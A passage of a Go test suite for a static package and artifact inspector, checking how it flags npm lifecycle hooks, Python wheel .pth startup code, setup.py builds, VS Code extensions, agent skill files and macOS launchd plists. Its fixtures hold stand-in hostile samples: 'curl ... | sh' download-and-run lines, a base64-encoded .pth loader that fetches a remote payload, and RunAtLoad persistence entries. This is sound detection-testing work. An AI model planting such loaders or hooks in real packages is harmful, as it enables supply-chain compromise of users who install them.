		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "scripts", "install.js"), []byte(`fetch("https://node-install-hook.example/api")`), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, rep, "lifecycle-target", "postinstall")
	assertCapabilityWithConnectivity(t, rep, "package.package-json-lifecycle", "CONNECTED")
	assertNetworkDestination(t, rep, "https://node-preload-hook.example/api")
	assertNetworkDestination(t, rep, "https://node-install-hook.example/api")
}

func TestInspectPackageLifecycleDenoRunTarget(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "scripts"), 0o700); err != nil {
		t.Fatal(err)
	}
	pkg := `{"scripts":{"postinstall":"deno run --allow-net scripts/install.js"}}`
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(pkg), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "scripts", "install.js"), []byte(`fetch("https://deno-install-hook.example/api")`), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, rep, "lifecycle-target", "postinstall")
	assertCapabilityWithConnectivity(t, rep, "package.package-json-lifecycle", "CONNECTED")
	assertNetworkDestination(t, rep, "https://deno-install-hook.example/api")
}

func TestInspectPackageLifecycleNpmRunScriptTarget(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "dist"), 0o700); err != nil {
		t.Fatal(err)
	}
	pkg := `{"scripts":{"postinstall":"npm run setup","setup":"node dist/install.js"}}`
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(pkg), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "dist", "install.js"), []byte(`fetch("https://npm-run-target.example/api")`), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, rep, "npm-script", "postinstall")
	assertExecutionRecord(t, rep, "script-target", "install.js")
	assertFeature(t, rep, "package.script.reference", "setup")
	assertCapabilityWithConnectivity(t, rep, "package.package-json-lifecycle", "CONNECTED")
	assertNetworkDestination(t, rep, "https://npm-run-target.example/api")
}

func TestInspectPackageLifecycleDynamicNpmRunScriptTargetIsNotResolved(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "dist"), 0o700); err != nil {
		t.Fatal(err)
	}
	pkg := `{"scripts":{"postinstall":"npm run \"$SCRIPT\"","setup":"node dist/install.js"}}`
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(pkg), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "dist", "install.js"), []byte(`fetch("https://dynamic-npm-run.example/api")`), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, rep, "npm-script", "postinstall")
	assertNoExecutionRecord(t, rep, "lifecycle-target", "postinstall")
	if hasCapability(rep, "package.package-json-lifecycle") {
		t.Fatalf("dynamic npm run target should not produce lifecycle behavior: %#v", rep.Capabilities)
	}
}

func TestInspectPythonWheelDeclaredExecutionRoots(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sample.whl")
	data := zipEntries(t, map[string][]byte{
		"sample-1.0.dist-info/entry_points.txt": []byte("[console_scripts]\nrunner = sample.cli:main\n[gui_scripts]\nviewer = sample.gui:main\n"),
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}

	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, rep, "console_scripts", "runner")
	assertExecutionRecord(t, rep, "gui_scripts", "viewer")
	assertArtifactNode(t, rep, "sample.whl!sample-1.0.dist-info/entry_points.txt", "manifest")
}

func TestInspectPythonWheelPTHSiteStartupRoot(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sample-1.0-py3-none-any.whl")
	pthPath := "startup.pth"
	wheelPath := "sample-1.0.dist-info/WHEEL"
	recordPath := "sample-1.0.dist-info/RECORD"
	decoded := "import requests\n" + strings.Repeat("# bounded filler\n", 256) + `requests.get("https://python-pth-stage.example/payload")` + "\n"
	encoded := base64.StdEncoding.EncodeToString([]byte(decoded))
	pth := []byte(`import subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('` + encoded + `'))"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)` + "\n")
	wheel := []byte("Wheel-Version: 1.0\nGenerator: maratus-test\nRoot-Is-Purelib: true\nTag: py3-none-any\n")
	record := []byte(reportWheelRecordLine(pthPath, pth) + reportWheelRecordLine(wheelPath, wheel) + recordPath + ",,\n")
	data := zipEntries(t, map[string][]byte{
		pthPath:    pth,
		wheelPath:  wheel,
		recordPath: record,
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}

	first, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	second, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, first, "python-site-startup", "startup.pth")
	assertFeature(t, first, "python.base64_decoded_script", "literal base64 exec")
	assertOperation(t, first, behavior.OperationInterpreterInvoke, "file", "python")
	assertOperation(t, first, behavior.OperationNetworkConnect, "network-destination", "https://python-pth-stage.example/payload")
	assertCoverageContains(t, first, "python-wheel-pth-startup", "partial", "conditional Python site-startup root")
	assertCoverageContains(t, first, "python-wheel-pth-startup", "partial", "only one exact same-line subprocess.Popen")
	assertReportReferencesValid(t, first)

	var firstJSON, secondJSON bytes.Buffer
	if err := WriteJSON(&firstJSON, first); err != nil {
		t.Fatal(err)
	}
	if err := WriteJSON(&secondJSON, second); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(firstJSON.Bytes(), secondJSON.Bytes()) {
		t.Fatal("Python wheel .pth report is not deterministic")
	}
	if bytes.Contains(firstJSON.Bytes(), []byte(encoded)) {
		t.Fatal("report retained the complete encoded Python stage")
	}
	reportPath := filepath.Join(root, "report.json")
	if err := os.WriteFile(reportPath, firstJSON.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(reportPath); err != nil {
		t.Fatalf("strict report reload failed: %v", err)
	}
}

func TestInspectPythonLegacySourceDistributionBuildRoot(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sample_pkg-1.2.3.tar.gz")
	setupPath := "sample_pkg-1.2.3/setup.py"
	data := tgz(t, map[string]string{
		"sample_pkg-1.2.3/PKG-INFO": "Metadata-Version: 2.4\nName: sample-pkg\nVersion: 1.2.3\n",
		setupPath: strings.Join([]string{
			"import subprocess",
			`subprocess.run(["/usr/bin/module-body"])`,
			"def dormant():",
			"    import subprocess",
			`    subprocess.run(["/usr/bin/function-body"])`,
			"",
		}, "\n"),
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}

	first, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	second, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}

	setupNodeID := ""
	archiveNodeID := ""
	for _, node := range first.ArtifactNodes {
		switch node.LogicalPath {
		case filepath.Base(path):
			archiveNodeID = node.ID
		case filepath.Base(path) + "!" + setupPath:
			setupNodeID = node.ID
		}
	}
	if archiveNodeID == "" || setupNodeID == "" {
		t.Fatalf("source distribution lacks exact archive/setup.py nodes: %#v", first.ArtifactNodes)
	}

	if len(first.ExecutionRoots) != 1 {
		t.Fatalf("legacy source distribution roots = %d, want one exact setup.py root: roots=%#v coverage=%#v", len(first.ExecutionRoots), first.ExecutionRoots, first.Coverage)
	}
	sourceBuildRoot := first.ExecutionRoots[0]
	if sourceBuildRoot.Kind != "python-source-build" ||
		sourceBuildRoot.DeclarationNodeID != archiveNodeID ||
		sourceBuildRoot.StartNodeID != setupNodeID ||
		sourceBuildRoot.StartScopeID == "" ||
		sourceBuildRoot.Name != "setuptools.build_meta:__legacy__" ||
		sourceBuildRoot.Interpreter != "python" ||
		len(sourceBuildRoot.Arguments) != 0 {
		t.Fatalf("legacy source distribution root does not describe the exact setup.py build entry: %#v", sourceBuildRoot)
	}
	if len(sourceBuildRoot.EvidenceIDs) == 0 {
		t.Fatalf("legacy source distribution root lacks located evidence: %#v", sourceBuildRoot)
	}
	scopeFound := false
	for _, scope := range first.Scopes {
		if scope.ID == sourceBuildRoot.StartScopeID && scope.NodeID == setupNodeID {
			scopeFound = true
			break
		}
	}
	if !scopeFound {
		t.Fatalf("source-build start scope is not owned by setup.py: root=%#v scopes=%#v", sourceBuildRoot, first.Scopes)
	}

	propertyCount := 0
	for _, property := range first.ArtifactProperties {
		if property.Kind != "python-distribution-format" || property.Value != "source-distribution" {
			continue
		}
		propertyCount++
		if property.NodeID != archiveNodeID ||
			property.Support != behavior.SupportCorroborated ||
			len(property.EvidenceIDs) == 0 {
			t.Fatalf("source-distribution property lacks archive ownership or corroborated evidence: %#v", property)
		}
	}
	if propertyCount != 1 {
		t.Fatalf("python-distribution-format=source-distribution properties = %d, want one: %#v", propertyCount, first.ArtifactProperties)
	}

	var moduleOperation, functionOperation *behavior.ModeledOperation
	for index := range first.Operations {
		operation := &first.Operations[index]
		switch {
		case operation.Kind == behavior.OperationProcessExecute && testOperationHasReportResource(*operation, "file", "/usr/bin/module-body"):
			moduleOperation = operation
		case operation.Kind == behavior.OperationProcessExecute && testOperationHasReportResource(*operation, "file", "/usr/bin/function-body"):
			functionOperation = operation
		case operation.Kind == behavior.OperationPackageInstall:
			t.Fatalf("recognizing a source-build entry fabricated package installation: %#v", operation)
		}
	}
	if moduleOperation == nil ||
		moduleOperation.SubjectNodeID != setupNodeID ||
		moduleOperation.SourceFunction != "" ||
		moduleOperation.Execution.Connectivity != behavior.ConnectivityConnected ||
		!slices.Equal(moduleOperation.Execution.ExecutionRootIDs, []string{sourceBuildRoot.ID}) ||
		len(moduleOperation.Execution.InvokedTargetIDs) != 0 {
		t.Fatalf("setup.py module-body behavior is not connected only to the source-build root: %#v", moduleOperation)
	}
	if functionOperation == nil ||
		functionOperation.SubjectNodeID != setupNodeID ||
		functionOperation.SourceFunction != "dormant" ||
		functionOperation.Execution.Connectivity != behavior.ConnectivityUnknown ||
		len(functionOperation.Execution.ExecutionRootIDs) != 0 ||
		len(functionOperation.Execution.InvokedTargetIDs) != 0 {
		t.Fatalf("uncalled setup.py function behavior did not remain UNKNOWN: %#v", functionOperation)
	}

	selectionFound := false
	for _, selection := range first.AnalysisSelection {
		if selection.NodeID == setupNodeID && slices.Contains(selection.Reasons, behavior.SelectionReasonExecutionRoot) {
			selectionFound = true
			break
		}
	}
	if !selectionFound {
		t.Fatalf("setup.py source-build root lacks execution-root analysis selection: %#v", first.AnalysisSelection)
	}
	assertCoverageContains(t, first, "python-source-build-activation", "partial", "pip-26.1.2-setuptools-legacy")
	assertCoverageContains(t, first, "python-source-build-activation", "partial", "conditional")
	assertCoverageContains(t, first, "python-source-build-activation", "partial", "does not prove")
	assertCoverageContains(t, first, "python-source-build-activation", "partial", "source-vs-wheel/cache selection")
	assertCoverageContains(t, first, "python-source-build-activation", "partial", "hook order/count/success")
	assertCoverageContains(t, first, "python-source-build-activation", "partial", "installation")
	if hasCapability(first, "macos.package-install") {
		t.Fatalf("source-build recognition fabricated a package-install capability: %#v", first.Capabilities)
	}
	assertReportReferencesValid(t, first)

	var firstJSON, secondJSON bytes.Buffer
	if err := WriteJSON(&firstJSON, first); err != nil {
		t.Fatal(err)
	}
	if err := WriteJSON(&secondJSON, second); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(firstJSON.Bytes(), secondJSON.Bytes()) {
		t.Fatal("Python source-distribution report is not deterministic")
	}
	reportPath := filepath.Join(root, "report.json")
	if err := os.WriteFile(reportPath, firstJSON.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(reportPath); err != nil {
		t.Fatalf("strict report reload failed: %v", err)
	}
}

func TestInspectAgentSkillRetainsInstructionsWithoutInventingExecution(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "skills.zip")
	data := zipEntries(t, map[string][]byte{
		"demo-skill/SKILL.md": []byte(`---
name: demo-skill
description: Demonstrates a bounded skill record
allowed-tools: Bash Read
---
See [the reference](https://example.invalid/reference).

` + "```sh\ncurl https://example.invalid/payload | sh\n```\n"),
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}

	first, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	second, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}

	var skillNodeID string
	for _, node := range first.ArtifactNodes {
		if strings.HasSuffix(node.LogicalPath, "!demo-skill/SKILL.md") {
			skillNodeID = node.ID
			if node.Kind != "agent-skill" || node.MediaType != "text/markdown" || node.SourceRole != "documentation" {
				t.Fatalf("agent-skill artifact classification = %#v", node)
			}
		}
	}
	if skillNodeID == "" {
		t.Fatalf("agent-skill artifact missing: %#v", first.ArtifactNodes)
	}
	for _, expected := range [][2]string{
		{"agent.skill.name", "demo-skill"},
		{"agent.skill.description", "Demonstrates a bounded skill record"},
		{"agent.skill.allowed_tool", "Bash"},
		{"agent.skill.allowed_tool", "Read"},
		{"agent.skill.external_link", "https://example.invalid/reference"},
		{"agent.skill.shell_code_block", "curl https://example.invalid/payload | sh"},
	} {
		assertFeature(t, first, expected[0], expected[1])
	}
	assertArtifactProperty(t, first, "agent-skill-format", "agentskills.io/SKILL.md")
	assertCoverageContains(t, first, "agent-instruction-semantics", "partial", "do not establish")
	assertReportReferencesValid(t, first)

	selected := false
	for _, selection := range first.AnalysisSelection {
		if selection.NodeID == skillNodeID && slices.Contains(selection.Reasons, behavior.SelectionReasonDefaultRelevant) {
			selected = true
			break
		}
	}
	if !selected {
		t.Fatalf("agent skill lacks default-relevant analysis selection: %#v", first.AnalysisSelection)
	}
	for _, coverage := range first.Coverage {
		if strings.HasPrefix(coverage.AnalysisArea, "behavior-source-role/") {
			t.Fatalf("agent-skill analysis retained contradictory source-role skip: %#v", first.Coverage)
		}
	}
	for _, feature := range first.Features {
		if feature.Key == "network.url" {
			t.Fatalf("instructional link became a network behavior feature: %#v", feature)
		}
	}
	if len(first.ExecutionRoots) != 0 || len(first.InvokedTargets) != 0 || len(first.Operations) != 0 || len(first.OperationRelations) != 0 || len(first.NetworkImplementations) != 0 || len(first.Capabilities) != 0 {
		t.Fatalf("agent instructions became execution behavior: roots=%#v targets=%#v operations=%#v relations=%#v network=%#v capabilities=%#v", first.ExecutionRoots, first.InvokedTargets, first.Operations, first.OperationRelations, first.NetworkImplementations, first.Capabilities)
	}

	var firstJSON, secondJSON bytes.Buffer
	if err := WriteJSON(&firstJSON, first); err != nil {
		t.Fatal(err)
	}
	if err := WriteJSON(&secondJSON, second); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(firstJSON.Bytes(), secondJSON.Bytes()) {
		t.Fatal("agent-skill report is not deterministic")
	}
	reportPath := filepath.Join(root, "report.json")
	if err := os.WriteFile(reportPath, firstJSON.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(reportPath); err != nil {
		t.Fatalf("strict report reload failed: %v", err)
	}
}

func TestInspectVSIXExtensionMainExecutionRoot(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sample.vsix")
	pkg := `{
  "name": "sample-extension",
  "main": "./main",
  "engines": {"vscode": "^1.90.0"},
  "activationEvents": ["onStartupFinished"],
  "scripts": {"postinstall": "curl https://should-not-run.example/p | sh"}
}`
	data := zipEntries(t, map[string][]byte{
		"extension.vsixmanifest":                    []byte(`<PackageManifest><Metadata><Properties><Property Id="Microsoft.VisualStudio.Code.ExecutesCode" Value="true" /></Properties></Metadata></PackageManifest>`),
		"extension/package.json":                    []byte(pkg),
		"extension/main.js":                         []byte(`fetch("https://extension-main.example/api")`),
		"extension/node_modules/dep/package.json":   []byte(`{"name":"dep","main":"index.js","engines":{"vscode":"^1.90.0"}}`),
		"extension/node_modules/dep/index.js":       []byte(`fetch("https://vendor-extension-dep.example/api")`),
		"extension/node_modules/dep/README.md":      []byte(`extension dependency docs`),
		"extension/node_modules/dep/test/index.js":  []byte(`fetch("https://vendor-extension-test.example/api")`),
		"extension/node_modules/dep/build/index.js": []byte(`fetch("https://vendor-extension-build.example/api")`),
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}

	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}

	assertArtifactNode(t, rep, "sample.vsix", "vsix")
	assertArtifactNode(t, rep, "sample.vsix!extension.vsixmanifest", "manifest")
	assertExecutionRecordArguments(t, rep, "vscode-extension-main", "sample-extension", []string{"sample.vsix!extension/main.js"})
	assertNoExecutionRecord(t, rep, "vscode-extension-main", "dep")
	assertFeature(t, rep, "vscode.extension.entrypoint", "./main")
	assertFeature(t, rep, "vscode.extension.activation_event", "onStartupFinished")
	assertNetworkDestination(t, rep, "https://extension-main.example/api")
	assertNoNetworkDestination(t, rep, "https://should-not-run.example/p")
	for _, feature := range rep.Features {
		if feature.Key != "vscode.extension.activation_event" {
			continue
		}
		if feature.Support != behavior.SupportDirect ||
			feature.Execution.Connectivity != behavior.ConnectivityUnknown ||
			len(feature.Execution.ExecutionRootIDs) != 0 ||
			len(feature.EvidenceIDs) != 1 {
			t.Fatalf("activation-event feature claimed execution or lost direct evidence: %#v", feature)
		}
		foundEvidence := false
		for _, evidence := range rep.Evidence {
			if evidence.ID == feature.EvidenceIDs[0] {
				foundEvidence = evidence.Kind == "vscode-extension-activation-event-declaration" &&
					evidence.Value == "activationEvents: onStartupFinished"
				break
			}
		}
		if !foundEvidence {
			t.Fatalf("activation-event feature lost exact evidence: %#v", feature)
		}
	}
	if hasCapability(rep, "package.package-json-lifecycle") || hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("VS Code extension package scripts should not be npm install capabilities: %#v", rep.Capabilities)
	}
	for _, operation := range rep.Operations {
		if operation.Kind == "network.connect" && operation.RequiredResource().Value == "https://extension-main.example/api" {
			if operation.Execution.Connectivity != behavior.ConnectivityConnected || len(operation.Execution.ExecutionRootIDs) == 0 {
				t.Fatalf("extension main network operation should be execution-root scoped: %#v", operation)
			}
			var firstJSON, secondJSON bytes.Buffer
			second, err := InspectPath(path, artifact.Options{})
			if err != nil {
				t.Fatal(err)
			}
			if err := WriteJSON(&firstJSON, rep); err != nil {
				t.Fatal(err)
			}
			if err := WriteJSON(&secondJSON, second); err != nil {
				t.Fatal(err)
			}
			if !bytes.Equal(firstJSON.Bytes(), secondJSON.Bytes()) {
				t.Fatal("VSIX activation metadata report is not deterministic")
			}
			reportPath := filepath.Join(root, "report.json")
			if err := os.WriteFile(reportPath, firstJSON.Bytes(), 0o600); err != nil {
				t.Fatal(err)
			}
			if _, err := Load(reportPath); err != nil {
				t.Fatalf("strict report reload failed: %v", err)
			}
			return
		}
	}
	t.Fatalf("missing extension main network operation: %#v", rep.Operations)
}

func TestInspectVSIXBrowserEntrypointDoesNotPromoteLocalProcessBehavior(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "browser.vsix")
	data := zipEntries(t, map[string][]byte{
		"extension/package.json": []byte(`{"name":"web-extension","browser":"dist/web.js","engines":{"vscode":"^1.90.0"}}`),
		"extension/dist/web.js":  []byte(`const child_process = require("child_process"); child_process.execFileSync("/tmp/web-worker-decoy")`),
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}

	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}

	assertNoExecutionRecord(t, rep, "vscode-extension-browser", "web-extension")
	if len(rep.InvokedTargets) != 1 || rep.InvokedTargets[0].Kind != "vscode-extension-browser" ||
		rep.InvokedTargets[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("browser declaration was not retained as an unresolved runtime target: %#v", rep.InvokedTargets)
	}
	found := false
	for _, operation := range rep.Operations {
		if operation.Kind == behavior.OperationProcessExecute && operation.RequiredResource().Value == "/tmp/web-worker-decoy" {
			found = true
			if operation.Execution.Connectivity != behavior.ConnectivityUnknown {
				t.Fatalf("web-extension process-shaped code gained local execution ownership: %#v", operation)
			}
		}
	}
	if !found {
		t.Fatalf("browser target was not retained in the observable feature/operation lane: %#v", rep.Operations)
	}
	covered := false
	for _, coverage := range rep.Coverage {
		if coverage.AnalysisArea == "vscode-browser-runtime" && coverage.Status == "partial" {
			covered = true
			break
		}
	}
	if !covered {
		t.Fatalf("web-extension runtime limitation was silent: %#v", rep.Coverage)
	}
}

func TestInspectNormalPackageMainIsNotVSCodeExecutionRoot(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(`{"name":"plain","main":"main.js"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "main.js"), []byte(`fetch("https://plain-main.example/api")`), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNoExecutionRecord(t, rep, "vscode-extension-main", "plain")
	if hasCapability(rep, "package.package-json-lifecycle") {
		t.Fatalf("plain package main should not create lifecycle capability: %#v", rep.Capabilities)
	}
}

func TestInspectDirectoryUnrelatedScriptRetainsUnknownCapability(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(`{"scripts":{"postinstall":"echo ok"}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	body := "curl https://unconnected.example/p -o /tmp/x\nchmod +x /tmp/x\n/tmp/x\n"
	if err := os.WriteFile(filepath.Join(root, "unrelated.sh"), []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapabilityWithConnectivity(t, rep, "macos.download-execute", string(behavior.ConnectivityUnknown))
	assertNetworkDestination(t, rep, "https://unconnected.example/p")
}

func TestInspectAppBundleExecutionRootAndEmbeddedLaunchdFeature(t *testing.T) {
	root := t.TempDir()
	app := filepath.Join(root, "Fake.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	resources := filepath.Join(app, "Contents", "Resources")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(resources, 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<plist><dict><key>CFBundleExecutable</key><string>Fake</string><key>CFBundleIdentifier</key><string>com.example.fake</string></dict></plist>`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Fake"), []byte("not a real macho"), 0o700); err != nil {
		t.Fatal(err)
	}
	plist := `<plist><dict><key>Label</key><string>com.example.fake</string><key>ProgramArguments</key><array><string>/tmp/fake</string></array><key>RunAtLoad</key><true/></dict></plist>`
	if err := os.WriteFile(filepath.Join(resources, "com.example.fake.plist"), []byte(plist), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.launch-persistence") {
		t.Fatalf("embedded app resource launchd plist should not be installed-persistence capability: %#v", rep.Capabilities)
	}
	assertFeature(t, rep, "launchd.program", "/tmp/fake")
	if !hasRelationship(rep, "bundle-executable") {
		t.Fatalf("missing bundle-executable relationship: %#v", rep.Relationships)
	}
}

func TestInspectLaunchAgentProgramKey(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "com.example.agent.plist")
	body := `<plist><dict>
<key>Label</key><string>com.example.agent</string>
<key>Program</key><string>/tmp/helper</string>
<key>RunAtLoad</key><true/>
</dict></plist>`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.launch-persistence")
	assertExecutionRecordArguments(t, rep, "launchd-program", "com.example.agent", []string{"/tmp/helper"})
	foundCommandEvidence := false
	for _, evidence := range rep.Evidence {
		if evidence.Kind == "launchd-program" {
			foundCommandEvidence = true
			if evidence.Value != "/tmp/helper" {
				t.Fatalf("launchd evidence should contain the resolved command, got %#q", evidence.Value)
			}
		}
	}
	if !foundCommandEvidence {
		t.Fatalf("missing launchd evidence: %#v", rep.Evidence)
	}
}

func TestInspectLaunchAgentShellCommand(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "com.example.agent.plist")
	body := `<plist><dict>
<key>Label</key><string>com.example.agent</string>
<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl https://launchd.example/payload | sh</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.launch-persistence")
	assertCapability(t, rep, "macos.download-pipe-interpreter")
	assertCapabilityConnectivity(t, rep, "macos.download-pipe-interpreter", "CONNECTED")
	assertNetworkDestination(t, rep, "https://launchd.example/payload")
}

func TestInspectLaunchAgentProgramShellCommand(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "com.example.agent.plist")
	body := `<plist><dict>
<key>Label</key><string>com.example.agent</string>
<key>Program</key><string>/bin/sh</string>
<key>ProgramArguments</key><array><string>custom-argv-zero</string><string>-c</string><string>curl https://program-launchd.example/payload | sh</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.launch-persistence")
	assertCapability(t, rep, "macos.download-pipe-interpreter")
	assertNetworkDestination(t, rep, "https://program-launchd.example/payload")
	assertExecutionRecordArguments(t, rep, "launchd-program", "com.example.agent", []string{"/bin/sh", "-c", "curl https://program-launchd.example/payload | sh"})
}

func TestInspectLaunchAgentEnvShellCommand(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "com.example.agent.plist")
	body := `<plist><dict>
<key>Label</key><string>com.example.agent</string>
<key>ProgramArguments</key><array><string>/usr/bin/env</string><string>PATH=/usr/bin</string><string>bash</string><string>-lc</string><string>curl https://env-launchd.example/payload | sh</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.launch-persistence")
	assertCapability(t, rep, "macos.download-pipe-interpreter")
	assertNetworkDestination(t, rep, "https://env-launchd.example/payload")
}

func TestInspectLaunchAgentEnvOptionShellCommand(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "com.example.agent.plist")
	body := `<plist><dict>
<key>Label</key><string>com.example.agent</string>
<key>ProgramArguments</key><array><string>/usr/bin/env</string><string>-i</string><string>bash</string><string>-lc</string><string>curl https://env-option.example/payload | sh</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.launch-persistence")
	assertCapability(t, rep, "macos.download-pipe-interpreter")
	assertNetworkDestination(t, rep, "https://env-option.example/payload")
}

func TestInspectLaunchAgentPythonInlineBase64Exec(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "com.example.agent.plist")
	decoded := "import urllib2\nurllib2.urlopen('https://inline-python.example/payload')\n"
	encoded := base64.StdEncoding.EncodeToString([]byte(decoded))
	body := fmt.Sprintf(`<plist><dict>
<key>Label</key><string>com.example.agent</string>
<key>ProgramArguments</key><array><string>python</string><string>-c</string><string>import base64; exec(base64.b64decode('%s'))</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>`, encoded)
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.launch-persistence")
	assertFeature(t, rep, "python.base64_decoded_script", "literal base64 exec")
	assertNetworkDestination(t, rep, "https://inline-python.example/payload")
}

func TestInspectLaunchAgentDynamicPythonBase64IsNotDecoded(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "com.example.agent.plist")
	body := `<plist><dict>
<key>Label</key><string>com.example.agent</string>
<key>ProgramArguments</key><array><string>python</string><string>-c</string><string>import base64; exec(base64.b64decode(payload))</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.launch-persistence")
	assertNoFeature(t, rep, "python.base64_decoded_script", "literal base64 exec")
}

func TestInspectLaunchAgentNodeInlineEval(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "com.example.agent.plist")
	body := `<plist><dict>
